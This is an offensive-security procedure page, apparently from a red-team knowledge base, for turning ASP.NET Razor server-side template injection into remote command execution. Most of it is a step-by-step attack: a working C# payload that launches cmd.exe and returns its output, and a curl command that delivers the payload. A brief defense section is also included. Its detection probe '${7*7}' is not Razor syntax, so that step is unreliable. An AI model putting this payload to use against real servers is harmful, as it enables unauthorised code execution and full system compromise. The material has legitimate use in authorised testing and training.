---
id: ce1b4a73-dedf-4cc4-833e-42ce1610eec7
name: asp-razor-server-side-template-injection-with-csharp-command-execution
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:38.922524+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Execution|TA0002 - Execution]]'
techniques:
  - >-
    [[techniques/Command-and-Scripting-Interpreter|T1059 - Command and Scripting
    Interpreter]]
  - >-
    [[techniques/Exploit-Public-Facing-Application|T1190 - Exploit Public-Facing
    Application]]
sub_techniques:
  - '[[sub-techniques/PowerShell|T1059.001 - PowerShell]]'
  - '[[sub-techniques/Windows-Command-Shell|T1059.003 - Windows Command Shell]]'
tags:
  - '[[tags/ASP.NET Razor]]'
  - '[[tags/ASP.NET Razor - Command execution]]'
  - '[[tags/Server Side Template Injection]]'
  - ssti
  - rce
  - csharp
commands:
  - '[[commands/curl-send-razor-payload]]'
platforms:
  - Web
  - Windows
tools: []
validated: true
---

# ASP Razor Server Side Template Injection with C# Command Execution

## Summary

This procedure exploits a Server-Side Template Injection (SSTI) vulnerability in ASP.NET Razor views to inject and execute arbitrary C# code, enabling command execution on the target server. It targets applications where user input is directly rendered in Razor templates without proper sanitization, allowing attackers to achieve remote code execution (RCE) for reconnaissance, data exfiltration, or persistence.

## Description

ASP.NET Razor is a view engine that allows embedding C# code within HTML templates using the @{ } syntax. In vulnerable applications, if user-supplied input is interpolated into Razor templates without escaping (e.g., via @Model.UserInput), attackers can inject malicious C# expressions. This leads to SSTI, where the injected code is executed server-side during template rendering. The technique leverages the full power of C#, including access to .NET classes like System.Diagnostics.Process for spawning shells or executing system commands. This is particularly dangerous in web applications hosted on Windows servers, as it bypasses typical input validation and can lead to full system compromise. Use this in red team engagements against known vulnerable endpoints, such as search fields or dynamic content generators.

## Requirements

1. Network access to the vulnerable ASP.NET Razor application (e.g., HTTP/HTTPS endpoint).
2. Identification of an input point that is rendered unsanitized in a Razor view (e.g., via fuzzing or source review).
3. Tools like curl or Burp Suite for sending crafted requests.
4. Knowledge of the target server's OS (typically Windows for ASP.NET).

## Defense

Defensive measures and detection strategies:

- Implement strict input validation and sanitization using Html.Encode or Razor's @Html.Raw only for trusted content.
- Use parameterized templates and avoid dynamic code execution in views; migrate to safer rendering methods.
- Enable web application firewall (WAF) rules to detect common SSTI payloads like @{, @:, or .NET class invocations.
- Monitor server logs for anomalous process spawns (e.g., cmd.exe from w3wp.exe) and enable .NET runtime logging for code execution events.

## Objectives

1. Inject malicious C# code into a Razor template to achieve arbitrary code execution.
2. Execute system commands on the target server to gather information or escalate access.
3. Confirm successful RCE by observing command output in the HTTP response.

## Instructions

### Step 1: Identify Vulnerable Input Point

**Context**: Locate an endpoint where user input is directly embedded in a Razor template without escaping. This could be a search box, user profile field, or dynamic content renderer. Test by injecting simple expressions like "${7*7}" to check for evaluation (response should show 49 if vulnerable).

Use manual testing or fuzzing tools to confirm. No specific command needed here; use browser developer tools or proxy to inspect requests.

**Expected Output**: Response renders the evaluated expression, confirming SSTI.

### Step 2: Craft C# Payload for Command Execution

**Context**: Construct a C# snippet that uses .NET APIs to execute a system command and capture its output. This payload will be injected into the vulnerable input field. Start with a benign command like "whoami" to verify execution without causing disruption.

The payload leverages System.Diagnostics.Process to run cmd.exe and redirect output back to the HTTP response via Response.Write.

```csharp
@{var p = new System.Diagnostics.Process(); p.StartInfo.FileName = "cmd.exe"; p.StartInfo.Arguments = "/c whoami"; p.StartInfo.UseShellExecute = false; p.StartInfo.RedirectStandardOutput = true; p.Start(); var output = p.StandardOutput.ReadToEnd(); p.WaitForExit(); Response.Write(output);}
```

Replace the command in Arguments as needed (e.g., "/c dir" for directory listing).

**Expected Output**: The HTTP response includes the command's stdout, such as the current user (e.g., "iis apppool\defaultapppool").

### Step 3: Send Payload via HTTP Request

**Context**: Deliver the crafted payload to the vulnerable endpoint using a tool like curl. This simulates an attacker submitting the injection through a form or URL parameter. Ensure the request mimics legitimate traffic to evade basic filters.

**Command** ([[commands/curl-send-razor-payload]]):
```bash
curl -X POST -d "input=$@PAYLOAD@" $_TARGET_URL -H "Content-Type: application/x-www-form-urlencoded"
```

> This command sends a POST request with the payload in the 'input' parameter (adjust field name based on the app). $_TARGET_URL is the vulnerable endpoint (e.g., http://target.com/search). $@PAYLOAD@ is the URL-encoded C# snippet from Step 2. Expected output in the response body will contain the command results if successful. If the response is empty or errors, check encoding or try GET if applicable.

**Expected Output**: HTTP response body includes the executed command's output, confirming RCE.
